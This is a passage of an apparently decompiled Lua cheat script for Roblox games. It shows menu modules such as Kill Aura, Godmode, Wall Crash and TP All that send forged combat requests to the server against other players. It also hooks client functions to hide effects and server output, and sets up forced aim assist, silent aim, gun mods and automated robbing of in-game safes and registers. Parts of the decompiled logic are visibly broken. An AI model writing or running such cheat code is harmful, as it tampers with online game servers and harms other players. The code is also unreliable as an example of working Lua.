							end

							local function fn81(arg, arg2)
								arg = arg or LocalPlayer.Character
								arg2 = arg2 or 1
								local v13 = getCharacter()
								local v14 = getWallcombo(v13)

								for i = 1, arg2 do
									local n4 = Random(1000000)
									local v15 = Action()
									ReplicatedStorage.Remotes.Abilities.Ability:FireServer(v14, n4)

									ReplicatedStorage.Remotes.Combat.Action:FireServer(
										v14,
										"Characters:" .. v13 .. ":WallCombo",
										1,
										n4,
										{
											HitboxCFrames = { nil },
											BestHitCharacter = arg,
											HitCharacters = { arg },
											Ignore = { [v15] = { arg } },
											DeathInfo = {},
											Actions = { [v15] = {} },
											HitInfo = { Blocked = false, IsFacing = true, IsInFront = true },
											BlockedCharacters = {},
											ServerTime = tick(),
											FromCFrame = nil,
										},
										v15
									)
								end
							end

							local function fn82(arg)
								setthreadidentity(2)
								local v13 = getWallcombo(getCharacter())
								local n4 = Random(1000000)
								Spawn(execDash)
								local position = LocalPlayer.Character.HumanoidRootPart.Position
								Core.Library("Remote").Send("Ability", v13, n4, nil, arg, position)
								local character = LocalPlayer.Character
								Core.Get("Combat", "Action").Event(v13, character, 1, n4, { Suggestions = arg }, 0)
								setthreadidentity(8)
							end

							local function fn83(arg)
								setthreadidentity(2)
								local v13 = getWallcombo(getCharacter())
								local n4 = Random(1000000)
								Spawn(execDash)
								local position = LocalPlayer.Character.HumanoidRootPart.Position
								Core.Library("Remote").Send("Ability", v13, n4, nil, arg, position)
								local character = LocalPlayer.Character
								Core.Get("Combat", "Action").Event(v13, character, 1, n4, { Suggestions = arg }, 0)
								local character2 = LocalPlayer.Character
								Core.Get("Combat", "Action").Event(v13, character2, 2, n4, nil, nil, true)
								local character3 = LocalPlayer.Character
								Core.Get("Combat", "Action").Event(v13, character3, 3, n4, nil, nil, true)
								setthreadidentity(8)
							end

							local function fn84(arg)
								local v13 = getWallcombo(getCharacter())
								local n4 = Random(1000000)
								Spawn(execDash)
								ReplicatedStorage.Remotes.Abilities.Ability:FireServer(v13, n4)

								ReplicatedStorage.Remotes.Combat.Action:FireServer(
									v13,
									"",
									4,
									n4,
									{ BestHitCharacter = arg, HitCharacters = { arg }, Ignore = {}, Actions = {} }
								)
							end

							local function fn85(arg)
								ReplicatedStorage.Remotes.Character.ChangeCharacter:FireServer(arg)
							end

							local function fn86(arg, arg2)
								local v13 = getAbility(getCharacter(), arg2)
								local n4 = Random(1000000)
								Spawn(execDash)

								local str3 = GetAttribute(LocalPlayer.Character, "TransformationLoaded") and "Ultimates"
									or "Abilities"

								ReplicatedStorage.Remotes.Abilities.Ability:FireServer(v13, n4)

								ReplicatedStorage.Remotes.Combat.Action:FireServer(
									v13,
									getCharacter() .. ":" .. str3 .. ":" .. arg2,
									1,
									n4,
									{
										HitboxCFrames = { arg.HumanoidRootPart.CFrame },
										BestHitCharacter = arg,
										HitCharacters = { arg },
										Ignore = { Action1687 = { arg } },
										ServerTime = workspace:GetServerTimeNow(),
										HitInfo = { IsFacing = true, IsInFront = true, Blocked = false },
										Actions = { Action1687 = {} },
										FromCFrame = arg.HumanoidRootPart.CFrame,
									},
									Action1687
								)

								ReplicatedStorage.Remotes.Abilities.AbilityCanceled:FireServer(v13)
							end

							local function fn87(arg)
								Spawn(execDash)
								local cFrame = (arg and FindFirstChild(arg, "HumanoidRootPart")).CFrame
								local v13 = getAbility(getCharacter(), "4")
								local n4 = Random(1000000)
								local tbl14 = { 377, 380, 383, 384, 385, 387, 389 }

								for i = 1, 2 do
									ReplicatedStorage.Remotes.Abilities.Ability:FireServer(v13, n4)

									for i2 = 1, 7 do
										local flag2 = i2 <= 2
										local tbl15 = {}

										local tbl16 = {
											HitboxCFrames = { cFrame, cFrame },
											BestHitCharacter = arg,
											HitCharacters = { arg },
											Ignore = flag2 and {} or { ActionNumber1 = { arg } },
											DeathInfo = {},
											BlockedCharacters = {},
											HitInfo = { IsFacing = not flag2, IsInFront = flag2 },
											ServerTime = tick(),
											Actions = flag2 and {} or { ActionNumber1 = {} },
											FromCFrame = cFrame,
										}

										local str3 = "Action" .. tbl14[i2]
										local n5 = i2 == 2 and 0.1 or nil
										tbl15[1] = v13
										tbl15[2] = "Mob:Abilities:4"
										tbl15[3] = i2
										tbl15[4] = n4
										tbl15[5] = tbl16
										tbl15[6] = str3
										tbl15[7] = n5

										if i2 == 7 then
											tbl15[5].RockCFrame = cFrame
										end

										ReplicatedStorage.Remotes.Combat.Action:FireServer(unpack(tbl15))
									end
								end

								local abilityCanceled =
									FindFirstChild(ReplicatedStorage.Remotes.Abilities, "AbilityCanceled")

								if abilityCanceled then
									abilityCanceled:FireServer(mobAbility)
								end
							end

							local cFrame = nil

							ubgRage:CreateModule({
								Id = "UBG_instant_respawn",
								Name = "Instant Respawn",
								Default = false,
								Callback = function(instantRespawn)
									tbl12.InstantRespawn = instantRespawn

									coroutine.wrap(function()
										while tbl12.InstantRespawn and Wait() do
											if
												not (
													not LocalPlayer.Character
													or not FindFirstChild(LocalPlayer.Character, "Humanoid")
												)
											then
												if
													Sub(
															tostring(Floor(LocalPlayer.Character.Humanoid.Health)),
															1,
															1
														)
														== "0"
													and not cFrame
												then
													cFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
													pcall(replicatesignal, LocalPlayer.Kill)

													if LocalPlayer.Character then
														LocalPlayer.Character:BreakJoints()
													end
												end
											end
										end
									end)()
								end,
							})

							Connect(LocalPlayer.CharacterAdded, function(arg)
								if tbl12.InstantRespawn then
									local humanoidRootPart = arg:WaitForChild("HumanoidRootPart", 5)

									if humanoidRootPart then
										Delay(0.2, function()
											humanoidRootPart.CFrame = cFrame
											cFrame = nil
										end)
									end
								end
							end)

							ubgRage:CreateModule({
								Id = "UBG_anti_grab",
								Name = "Anti Grab",
								Default = false,
								Callback = function(antiGrab)
									tbl12.AntiGrab = antiGrab

									coroutine.wrap(function()
										while tbl12.AntiGrab and Wait(0.1) do
											if GetAttribute(LocalPlayer.Character, "Grabbed") then
												SetAttribute(LocalPlayer.Character, "Invalidated", true)

												Delay(0.1, function()
													SetAttribute(LocalPlayer.Character, "Invalidated", false)
												end)
											end
										end
									end)()
								end,
							})

							local wallAbuse = ubgRage:CreateModule({
								Id = "UBG_wall_abuse",
								Name = "Wall Abuse",
								Default = false,
								Callback = function(wallAbuse)
									tbl12.WallAbuse = wallAbuse

									coroutine.wrap(function()
										while tbl12.WallAbuse and Wait(tbl12.WallAbuseDelay) do
											for i = 1, #tbl13.live do
												Spawn(fn83, tbl13.live[i])
												if tbl12.WallAbuse then
													continue
												end
												break
											end
										end
									end)()
								end,
							})

							wallAbuse:CreateSlider({
								Id = "UBG_wall_abuse_delay",
								Name = "Delay",
								Min = 1,
								Max = 100,
								Default = tbl12.WallAbuseDelay * 1000,
								Step = 1,
								Callback = function(arg)
									tbl12.WallAbuseDelay = arg / 1000
								end,
							})

							wallAbuse:CreateToggle({
								Id = "UBG_wall_abuse_death",
								Name = "Death",
								Default = tbl12.WallAbuseDeath,
								Callback = function(wallAbuseDeath)
									tbl12.WallAbuseDeath = wallAbuseDeath
								end,
							})

							ubgRage:CreateModule({
								Id = "UBG_carry_abuse",
								Name = "Carry Abuse",
								Default = false,
								Callback = function(carryAbuse)
									tbl12.CarryAbuse = carryAbuse

									coroutine.wrap(function()
										while tbl12.CarryAbuse and Wait(0.1) do
											for i = 1, #tbl13.live do
												Spawn(fn82, tbl13.live[i])
											end
										end
									end)()
								end,
							})

							ubgRage:CreateModule({
								Id = "UBG_kill_aura",
								Name = "Kill Aura",
								Default = false,
								Callback = function(killAura)
									tbl12.KillAura = killAura

									coroutine.wrap(function()
										while tbl12.KillAura and Wait(0.01) do
											for i = 1, #tbl13.live do
												Spawn(fn84, tbl13.live[i])
											end
										end
									end)()
								end,
							})

							ubgRage
								:CreateModule({
									Id = "UBG_ability_aura",
									Name = "Ability Aura",
									Default = false,
									Callback = function(abilityAura)
										tbl12.AbilityAura = abilityAura

										coroutine.wrap(function()
											while tbl12.AbilityAura and Wait(0.01) do
												if tbl12.AbilityAuraMode == "Gon" then
													if getCharacter() ~= "Gon" then
														fn85("Gon")
													end

													for i = 1, #tbl13.live do
														Spawn(fn86, tbl13.live[i], "2")
													end
												else
													if getCharacter() ~= "Mob" then
														fn85("Mob")
													end

													for i = 1, #tbl13.live do
														Spawn(fn87, tbl13.live[i])
													end
												end
											end
										end)()
									end,
								})
								:CreateSelector({
									Id = "UBG_ability_aura_mode",
									Name = "Mode",
									Options = { "Gon", "Dragon" },
									Default = tbl12.AbilityAuraMode,
									Callback = function(abilityAuraMode)
										tbl12.AbilityAuraMode = abilityAuraMode
									end,
								})

							ubgRage:CreateModule({
								Id = "UBG_prevent_respawn",
								Name = "Prevent Respawn",
								Default = false,
								Callback = function(preventRespawn)
									tbl12.PreventRespawn = preventRespawn

									coroutine.wrap(function()
										while tbl12.PreventRespawn and Wait(0.1) do
											for i = 1, #tbl13.died do
												Spawn(fn84, tbl13.died[i])
												if not (i > 3) then
													continue
												end
												break
											end
										end
									end)()
								end,
							})

							ubgRage:CreateModule({
								Id = "UBG_godmode",
								Name = "Godmode",
								Default = false,
								Callback = function(godmode)
									tbl12.Godmode = godmode

									coroutine.wrap(function()
										while tbl12.Godmode and Wait(0.001) do
											if #tbl13.bum > 0 then
												Spawn(fn82, tbl13.bum[Random(1, #tbl13.bum)])
											elseif #tbl13.team > 0 then
												Spawn(fn82, tbl13.team[Random(1, #tbl13.team)])
											elseif #tbl13.live > 0 then
												Spawn(fn82, tbl13.live[Random(1, #tbl13.live)])
											end
										end
									end)()

									coroutine.wrap(function()
										while tbl12.Godmode and Wait(0.1) do
											Spawn(fn81)
										end
									end)()
								end,
							})

							ubgRage
								:CreateModule({
									Id = "UBG_wall_crash",
									Name = "Wall Crash",
									Default = false,
									Callback = function(wallCrash)
										tbl12.WallCrash = wallCrash

										coroutine.wrap(function()
											while tbl12.WallCrash and Wait(tbl12.WallCrashDelay) do
												local n4 = #tbl13.bum
												local flag2 = false
												local v13

												if 1 <= 0 then
													if flag2 >= n4 then
														v13 = flag2
														fn81(tbl13.bum[v13], 50)
														flag2 = true
													end
												elseif flag2 <= n4 then
													v13 = flag2
													fn81(tbl13.bum[v13], 50)
													flag2 = true
												end

												if not flag2 then
													local n5 = #tbl13.live
													local n6 = 1

													if 1 <= 0 then
														if not (n6 >= n5) then
															continue
														end
													elseif not (n6 <= n5) then
														continue
													end

													fn81(tbl13.live[n6], 50)
												end
											end
										end)()
									end,
								})
								:CreateSlider({
									Id = "UBG_wall_crash_delay",
									Name = "Delay",
									Min = 1,
									Max = 100,
									Default = tbl12.WallCrashDelay * 1000,
									Step = 1,
									Callback = function(arg)
										tbl12.WallCrashDelay = arg / 1000
									end,
								})

							ubgRage:CreateModule({
								Id = "UBG_tp_all",
								Name = "TP All",
								Default = false,
								Callback = function(tpAll)
									tbl12.TPAll = tpAll

									coroutine.wrap(function()
										while tbl12.TPAll and Wait(0.1) do
											if
												not (
													not LocalPlayer.Character
													or not FindFirstChild(LocalPlayer.Character, "HumanoidRootPart")
												)
											then
												if #tbl13.tp ~= 0 then
													LocalPlayer.Character.HumanoidRootPart.CFrame = tbl13.tp[Random(
														1,
														#tbl13.tp
													)].HumanoidRootPart.CFrame * NewCFrame(0, 1, 0)
												end
											end
										end
									end)()
								end,
							})

							local ubgMisc = window:CreateTab({ Id = "ubg-misc", Name = "UBG Misc" })
							local tbl14 = { HideVFX = false, HideSound = false, HideOutput = false }
							local tbl15 = {}
							local tbl16 = {}
							local tbl17 = {}

							local function fn88(arg)
								if typeof(arg) ~= "function" or isfunctionhooked(arg) then
									return false
								end
								local v13 = hookfunction

								local v14 = luraph_runtime1(function() end)

								v13(arg, v14)
								return true
							end

							local function fn89(arg)
								for i = 1, #arg do
									local v13 = arg[i]

									if isfunctionhooked(v13) then
										restorefunction(v13)
									end
								end

								table.clear(arg)
							end

							local function fn90(arg, arg2)
								local tbl18 = {}
								local v13 = getgc(true)

								for i = 1, #v13 do
									local v14 = v13[i]

									if typeof(v14) == "function" then
										local ok4, result4 = pcall(getfenv, v14)

										if ok4 and result4 and result4.script == arg then
											if not arg2 then
												Insert(tbl18, v14)
												break
											else
												local ok5, result5 = pcall(debug.getinfo, v14)

												if (ok5 and result5.name or ""):lower():find(arg2, 1, true) then
													Insert(tbl18, v14)
												end
											end
										end
									end
								end

								return tbl18
							end

							local function fn91(arg, arg2, arg3)
								if not arg2 then
									fn89(arg)
									return
								end

								if #arg > 0 then
									return
								end
								local v13 = arg3()

								for i = 1, #v13 do
									local v14 = v13[i]

									if fn88(v14) then
										Insert(arg, v14)
									end
								end
							end

							ubgMisc:CreateModule({
								Id = "UBG_hide_vfx",
								Name = "Hide VFX",
								Default = tbl14.HideVFX,
								Callback = function(hideVFX)
									tbl14.HideVFX = hideVFX

									fn91(tbl15, hideVFX, function()
										local tbl18 = {}

										for _, v13 in VFXHelp, nil, nil do
											if typeof(v13) == "function" then
												Insert(tbl18, v13)
											end
										end

										return tbl18
									end)
								end,
							})

							ubgMisc:CreateModule({
								Id = "UBG_hide_sound",
								Name = "Hide Sound",
								Default = tbl14.HideSound,
								Callback = function(hideSound)
									tbl14.HideSound = hideSound

									fn91(tbl16, hideSound, function()
										return fn90(sound, "play")
									end)
								end,
							})

							ubgMisc:CreateModule({
								Id = "UBG_hide_server_output",
								Name = "Hide Server Output",
								Default = tbl14.HideOutput,
								Callback = function(hideOutput)
									tbl14.HideOutput = hideOutput

									fn91(tbl17, hideOutput, function()
										return fn90(console, nil)
									end)
								end,
							})
						end,
						Wanted = function()
							local load = require(
								FindFirstChild(ReplicatedStorage, "Devv") or FindFirstChild(ReplicatedStorage, "devv")
							).load

							local nuid = load("NUID")
							local Network = load("Network")
							local MathUtil = load("MathUtil")
							local ClientPlayers = load("ClientPlayers")
							local InputHandler_ = load("InputHandler")
							local ClientSettings = load("ClientSettings")
							local ClientGizmos = require(ReplicatedStorage.Client.Wanted.Modules.ClientGizmos)
							local ClientProps = require(ReplicatedStorage.Client.Wanted.Modules.ClientProps)
							local ClientTools = require(ReplicatedStorage.Client.Wanted.Modules.ClientTools)
							local ClientData = load("ClientData")
							local CombatUtil = require(ReplicatedStorage.Shared.Wanted.Modules.CombatUtil)
							local UpgradeUtil = require(ReplicatedStorage.Shared.Wanted.Modules.UpgradeUtil)
							local Objects = require(ReplicatedStorage.Shared.Wanted.Indicies.Objects)
							local DialogUtil = require(ReplicatedStorage.Client.Core.DialogUtil)
							local SettingsData = require(ReplicatedStorage.Shared.Wanted.Indicies.SettingsData)

							local AimAssist = require(
								ReplicatedStorage.Client.Wanted.Objects.ClientTool.Components.Tools.Guns.AimAssist
							)

							local Shooter = require(
								ReplicatedStorage.Client.Wanted.Objects.ClientTool.Components.Tools.Guns.Shooter
							)

							local fireServer = Network.FireServer
							local invokeServer = Network.InvokeServer
							local userId = LocalPlayer.UserId
							local getInputType = InputHandler_.GetInputType

							local function fn68(...)
								local v10 = debug.info(2, "s")

								if type(v10) ~= "string" or v10 == "" then
									v10 = debug.info(3, "s")
								end

								if type(v10) == "string" and v10:find("AimAssist", 1, true) then
									return "Touch"
								end
								return getInputType(...)
							end

							getInputType = hookfunction
							getInputType = getInputType(InputHandler_.GetInputType, fn68)

							local assistSensitivity = SettingsData.settingDataByName
								and SettingsData.settingDataByName.assistSensitivity

							if type(assistSensitivity) == "table" and type(assistSensitivity.inputTypes) == "table" then
								local flag = false

								for i = 1, #assistSensitivity.inputTypes do
									if assistSensitivity.inputTypes[i] == "KeyboardAndMouse" then
										flag = true
										break
									end
								end

								if not flag then
									Insert(assistSensitivity.inputTypes, "KeyboardAndMouse")
								end
							end

							local n4 = 0.8
							local str3 = "Buzzsaw"
							local n5 = 10

							local function fn69(arg)
								local localPlayer = arg or LocalPlayer
								return localPlayer and localPlayer.Character
							end

							local function fn70(arg)
								local v10 = fn69(arg)
								return v10 and FindFirstChildOfClass(v10, "Humanoid")
							end

							local function fn71(arg)
								local v10 = fn69(arg)
								return v10 and FindFirstChild(v10, "HumanoidRootPart")
							end

							local function fn72(arg, arg2)
								return CombatUtil.CanPlayersPVP(arg or LocalPlayer, arg2)
							end

							local function fn73(arg)
								local v10 = ClientPlayers.Get()
								if not v10 or not arg then
									return
								end
								fireServer("equip", arg)
								pcall(setthreadidentity, 2)
								v10:SetEquipped({ toolId = arg, toolState = true })
								pcall(setthreadidentity, 8)
							end

							local function fn74(arg)
								local ok4, result4 = pcall(ClientTools.GetItems)
								if not ok4 or typeof(result4) ~= "table" then
									return nil
								end

								for _, v10 in next, result4, nil do
									if typeof(v10) ~= "table" then
										continue
									end

									for k, v11 in next, v10, nil do
										if
											v11
											and (
												v11.name == arg
												or v11.type == arg
												or k == arg
												or arg == str3 and v11.isBuzzSaw
											)
										then
											return { guid = k, data = v11 }
										end
									end
								end

								return nil
							end

							local function fn75()
								local tbl9 = { "None" }
								local tbl10 = { None = true }
								local ok4, result4 = pcall(ClientTools.GetItems)
								ok4 = ok4 and result4 and result4.Tool
								if not ok4 then
									return tbl9
								end

								for _, v10 in next, ok4, nil do
									v10 = v10 and v10.name

									if v10 and not tbl10[v10] then
										tbl10[v10] = true
										Insert(tbl9, v10)
									end
								end

								Sort(tbl9, function(arg, arg2)
									if arg == "None" then
										return true
									end

									if arg2 == "None" then
										return false
									end
									return arg < arg2
								end)

								return tbl9
							end

							local function fn76(arg)
								arg = arg and arg.UserId
								arg = arg and ClientPlayers.GetByPlayerId(arg)

								return {
									isDowned = arg and arg:IsDowned() or false,
									isCrawling = arg and arg:GetPlayerProperty("crawling") or false,
									isKnocked = arg and arg:GetPlayerProperty("knocked") or false,
									isGrabbed = arg and arg:GetPlayerProperty("grabbed") or false,
								}
							end

							local function fn77(arg)
								local tbl9 = {}
								if typeof(arg) ~= "table" then
									return tbl9
								end

								for i = 1, #arg do
									tbl9[tostring(arg[i])] = true
								end

								for k, v10 in pairs(arg) do
									if v10 == true then
										tbl9[tostring(k)] = true
									end
								end

								return tbl9
							end

							local function fn78(arg, arg2)
								if typeof(arg) ~= "table" then
									return arg == arg2
								end

								if Find(arg, arg2) ~= nil then
									return true
								end

								for i = 1, #arg do
									local v10 = arg[i]

									if
										typeof(v10) == "table"
										and (v10.Title == arg2 or v10.Value == arg2 or v10[1] == arg2)
									then
										return true
									end
								end

								return arg[arg2] == true or arg[tostring(arg2)] == true
							end

							local function fn79(arg)
								local tbl9 = {}
								local ok4, result4 = pcall(debug.getupvalue, ClientGizmos.Get, 1)
								if not ok4 or typeof(result4) ~= "table" then
									return tbl9
								end

								for k, v10 in next, result4, nil do
									if k and typeof(v10) == "table" and v10.position then
										v10.objectId = v10.objectId or k
										v10.dist = arg and (arg.Position - v10.position).Magnitude or math.huge
										Insert(tbl9, v10)
									end
								end

								Sort(tbl9, function(arg2, arg3)
									return arg2.dist < arg3.dist
								end)

								return tbl9
							end

							local function fn80()
								local v10 = fn71()
								local tbl9 = {}
								local v11 = GetClosest()

								for i = 1, #v11 do
									local v12 = v11[i]

									if v12 ~= LocalPlayer and CheckState(v12) then
										local v13 = fn69(v12)
										local v14 = fn70(v12)
										local v15 = fn71(v12)
										local head = v13 and FindFirstChild(v13, "Head")

										if v13 and v14 and v14.Health > 0 and v15 and head then
											Insert(tbl9, {
												plr = v12,
												char = v13,
												hum = v14,
												hrp = v15,
												head = head,
												dist = v10 and (v10.Position - v15.Position).Magnitude or math.huge,
											})
										end
									end
								end

								return tbl9
							end

							local function fn81(arg)
								if typeof(arg) ~= "table" then
									return false
								end

								if arg.isCurrency == true then
									return true
								end
								local gizmoType = arg.gizmoType
								return gizmoType == "Cash" or gizmoType == "CashPallet" or gizmoType == "MainCashPile"
							end

							local function fn82(arg)
								if typeof(arg) ~= "table" then
									return nil
								end
								local cashLeft = arg.cashLeft
								if type(cashLeft) == "number" then
									return cashLeft
								end
								local gizmoState = arg.gizmoState
								gizmoState = gizmoState and gizmoState.amount
								if type(gizmoState) == "number" then
									return gizmoState
								end
								return nil
							end

							local function fn83(arg)
								if typeof(arg) ~= "table" then
									return false
								end
								local gizmoType = arg.gizmoType

								if gizmoType == "ATM" or gizmoType == "Register" then
									local v10 = ClientPlayers.Get()

									if v10 and arg.position then
										pcall(function()
											v10:Melee(arg.position)
										end)

										return true
									end

									return false
								end

								if gizmoType == "WorldSafe" or gizmoType == "GasStationSafe" then
									if arg.objectId then
										fireServer("gizmoInteraction", arg.objectId, "OpenSafe")
										return true
									end
									return false
								end

								if gizmoType == "PC Block" then
									if arg.objectId then
										fireServer("gizmoInteraction", arg.objectId, "Search")
										return true
									end
									return false
								end

								if fn81(arg) then
									if not arg.objectId then
										return false
									end

									local v10 = table.create(
										(gizmoType == "CashPallet" or gizmoType == "MainCashPile") and 10 or 1,
										arg.objectId
									)

									pcall(invokeServer, "collectCurrency", v10)
									return true
								end

								if typeof(arg.AttemptCollect) == "function" then
									pcall(arg.AttemptCollect, arg)
									return true
								end

								if typeof(arg.Interact) == "function" then
									pcall(arg.Interact, arg)
									return true
								end
								return false
							end

							local function fn84(arg)
								if typeof(arg) ~= "table" or not arg.gizmoType then
									return false
								end
								local gizmoState = arg.gizmoState

								if gizmoState then
									if
										gizmoState.broken
										or gizmoState.searched
										or gizmoState.robbed
										or gizmoState.used
										or gizmoState.isDestroyed
									then
										return false
									end
								end

								if arg.broken or arg.searched or arg.robbed or arg.isCollected then
									return false
								end

								if fn81(arg) then
									local v10 = fn82(arg)
									if v10 ~= nil and v10 <= 0 then
										return false
									end
									return arg.objectId ~= nil
								end

								if typeof(arg.AttemptCollect) == "function" or typeof(arg.Interact) == "function" then
									return true
								end
								local gizmoType = arg.gizmoType

								return gizmoType == "ATM"
									or gizmoType == "Register"
									or gizmoType == "PC Block"
									or gizmoType == "WorldSafe"
									or gizmoType == "GasStationSafe"
							end

							local function fn85(arg)
								if typeof(arg) ~= "table" then
									return false
								end
								local properties = arg.properties
								if not (arg.isJewelry or properties and properties.source == "JewelSpawn") then
									return false
								end
								local gizmoState = arg.gizmoState
								return gizmoState ~= nil and gizmoState.disabled == true
							end

							local function fn86(arg, arg2)
								if not arg or typeof(ClientProps.worldPropsById) ~= "table" then
									return nil, nil
								end
								local v10 = nil

								for _, v11 in next, ClientProps.worldPropsById, nil do
									if typeof(v11) == "table" and v11.name == "JewelSpawn" and not v11.isShattered then
										local position = v11.GetPosition and v11:GetPosition()
											or v11.model
												and v11.model.PrimaryPart
												and v11.model.PrimaryPart.Position

										if position then
											local magnitude = (arg.Position - position).Magnitude

											if magnitude < arg2 then
												arg2 = magnitude
												v10 = v11
											end
										end
									end
								end

								return v10, arg2
							end

							local function fn87(arg)
								if typeof(arg) ~= "table" or arg.isShattered then
									return false
								end
								local Buzzsaw = fn74("Buzzsaw")
								if not Buzzsaw then
									return false
								end
								fn73(Buzzsaw.guid)
								local v10 = ClientPlayers.Get()

								local position = arg.GetPosition and arg:GetPosition()
									or arg.model and arg.model.PrimaryPart and arg.model.PrimaryPart.Position

								if not v10 or not position then
									return false
								end

								pcall(function()
									v10:Melee(position)
								end)

								return true
							end

							local function fn88()
								local ok4, result4 = pcall(ClientData.Get)
								if not ok4 or typeof(result4) ~= "table" or typeof(result4.bag) ~= "table" then
									return 0
								end
								local contents = result4.bag.contents
								local n6 = 0

								if typeof(contents) == "table" then
									for _, v10 in next, contents, nil do
										if typeof(v10) == "string" and v10 ~= "" then
											local v11 = Objects.GetDataProperty(v10, "weight")

											if type(v11) == "number" then
												n6 += v11
											end
										end
									end
								end

								local capacity = UpgradeUtil.GetBagCapacity()

								if type(capacity) ~= "number" or capacity <= 0 then
									capacity = type(result4.bag.capacity) == "number" and result4.bag.capacity or 1
								end

								return n6 / capacity
							end

							local function fn89()
								if GetAttribute(LocalPlayer, "isBagFull") then
									return true
								end

								if not GetAttribute(LocalPlayer, "hasLootBag") then
									return false
								end
								return fn88() >= n4
							end

							local legit = window:CreateTab({ Id = "wanted-legit", Name = "Legit" })

							local function fn90()
								local assistSensitivity2 = SettingsData.settingDataByName
									and SettingsData.settingDataByName.assistSensitivity

								local flag = type(assistSensitivity2) == "table"
									and type(assistSensitivity2.defaultValue) == "number"

								local n6 = 1

								if flag then
									n6 = assistSensitivity2.defaultValue
								end

								local ok4, result4 = pcall(function()
									return ClientSettings.Get("assistSensitivity")
								end)

								if not (ok4 and type(result4) == "number") then
									result4 = n6
								end

								local tbl9 = {}

								tbl9.AimAssist = {
									Module = nil,
									Enabled = false,
									UseFov = true,
									Fov = 45,
									FovColor = NewColor3(1, 1, 1),
									SpeedX = result4 > 0 and result4 or 2.7,
									SpeedY = 1,
									PredictionX = 2.8,
									PredictionY = 2.6,
									Range = 300,
									Part = "Body",
									Animation = "Linear",
								}

								tbl9.SilentAim = {
									Module = nil,
									Enabled = false,
									Fov = 10,
									HitChance = 50,
									Accuracy = 70,
									PointScale = 62,
									Priority = "Closest",
									Hitboxes = { Head = true, Body = true, Arms = true, Legs = true },
									PredictionX = 1.7,
									PredictionY = 1.1,
									VisualizeFov = false,
									IgnoreDowned = true,
								}

								tbl9.GunMod =
									{ Enabled = false, Recoil = 100, Spread = 100, BulletSpeed = 1, BulletLifetime = 1 }

								local function fn91(arg)
									return fn76(arg).isDowned == true
								end

								local function fn92(defaultValue)
									local assistSensitivity3 = SettingsData.settingDataByName
										and SettingsData.settingDataByName.assistSensitivity

									if type(assistSensitivity3) == "table" then
										assistSensitivity3.defaultValue = defaultValue
									end

									pcall(function()
										if type(ClientSettings.Set) == "function" then
											ClientSettings.Set("assistSensitivity", defaultValue)
										elseif type(ClientSettings.RetriggerUpdateCallback) == "function" then
											ClientSettings.RetriggerUpdateCallback("assistSensitivity", defaultValue)
										end
									end)
								end

								local n7 = Tan(Rad(35))
								local thickness = 1
								local transparency = 0.5
								local n8 = 0.032
								local n9 = 1000
								local n10 = 0.36
								local n11 = 0.9
								local v10 = nil
								local v11 = nil
								local v12 = nil
								local connection = nil
								local v13 = nil
								local v14 = nil
								local v15 = nil
								local v16 = nil

								local tbl10 = {
									MaxTargets = 64,
									Count = 0,
									LosParams = NewRayParams(),
									LosFilter = { nil, nil },
									LosReady = false,
									FovLastShow = false,
									FovLastX = 0,
									FovLastY = 0,
									FovLastDiam = 0,
									FovLastColor = nil,
								}

								tbl10.LosParams.FilterType = Enum.RaycastFilterType.Exclude
								tbl10.LosParams.IgnoreWater = true
								local step = AimAssist.Step

								pcall(function()
									local hui = typeof(gethui) == "function" and gethui() or CoreGui
									local ScreenGui = NewInstance("ScreenGui")
									ScreenGui.Name = "\0"
									ScreenGui.IgnoreGuiInset = true
									ScreenGui.ResetOnSpawn = false
									ScreenGui.DisplayOrder = 10
									ScreenGui.Parent = hui
									local Frame = NewInstance("Frame")
									Frame.Name = "\0"
									Frame.BackgroundTransparency = 1
									Frame.AnchorPoint = NewVector2(0.5, 0.5)
									Frame.BorderSizePixel = 0
									Frame.Visible = false
									Frame.Parent = ScreenGui
									local UICorner = NewInstance("UICorner")
									UICorner.CornerRadius = NewUDim(1, 0)
									UICorner.Parent = Frame
									local UIStroke = NewInstance("UIStroke")
									UIStroke.Thickness = thickness
									UIStroke.Transparency = transparency
									UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
									UIStroke.Parent = Frame
									v10 = ScreenGui
									v11 = Frame
									v12 = UIStroke
								end)

								local function fn93(arg)
									local viewportSize = arg.ViewportSize
									if UserInputService.TouchEnabled then
										return viewportSize.X * 0.5, viewportSize.Y * 0.5
									end
									local mouseLocation = MouseLocation()
									return mouseLocation.X, mouseLocation.Y
								end

								local function fn94(arg, arg2)
									local n12 = Clamp((arg2 or 0) * 0.5, 0, 89)
									arg = arg and arg.ViewportSize.Y or 0
									if arg < 1 then
										return 0
									end
									return arg * 0.5 * Tan(Rad(n12)) / n7
								end

								local function fn95()
									if connection then
										Disconnect(connection)
										connection = nil
									end

									if v11 and v11.Visible then
										v11.Visible = false
									end

									tbl10.FovLastShow = false
								end

								local function fn96()
									fn95()
									if not v11 or not v12 then
										return
									end

									local function fn97()
										local v17 = tbl10
										local aimAssist = tbl9.AimAssist
										local camera = Camera()

										local fovLastShow = (aimAssist.Module == nil or aimAssist.Module:Get() == true)
											and aimAssist.UseFov == true
											and camera ~= nil

										if v17.FovLastShow ~= fovLastShow then
											v17.FovLastShow = fovLastShow
											v11.Visible = fovLastShow
										end

										if not fovLastShow then
											return
										end
										local v18, v19 = fn93(camera)
										local fovLastDiam = Max(2, Floor(fn94(camera, aimAssist.Fov) * 2 + 0.5))
										local fovColor = aimAssist.FovColor or White

										if v17.FovLastColor ~= fovColor then
											v17.FovLastColor = fovColor
											v12.Color = fovColor
											v12.Transparency = transparency
										end

										if v17.FovLastX ~= v18 or v17.FovLastY ~= v19 then
											v17.FovLastX = v18
											v17.FovLastY = v19
											v11.Position = NewUDim2(0, v18, 0, v19)
										end

										if v17.FovLastDiam ~= fovLastDiam then
											v17.FovLastDiam = fovLastDiam
											v11.Size = NewUDim2(0, fovLastDiam, 0, fovLastDiam)
										end
									end

									fn97()
									connection = Connect(RunService.RenderStepped, fn97)
								end

								local function fn97(arg)
									local v17 = v13[7][v13[6] + arg]
									if not v17 then
										return nil
									end
									local part = tbl9.AimAssist.Part
									local v18 = v14[7][v14[6] + arg]
									local v19 = v15[7][v15[6] + arg]
									local v20 = v16[7][v16[6] + arg]

									if part == "Head" then
										if v18 and v18.Parent then
											return v18
										end
									elseif part == "Body" then
										if v19 and v19.Parent then
											return v19
										end

										if v20 and v20.Parent then
											return v20
										end
									end

									if v19 and v19.Parent then
										return v19
									end

									if v18 and v18.Parent then
										return v18
									end
									return v17.PrimaryPart
								end

								local function fn98()
									H[1].Count = 0
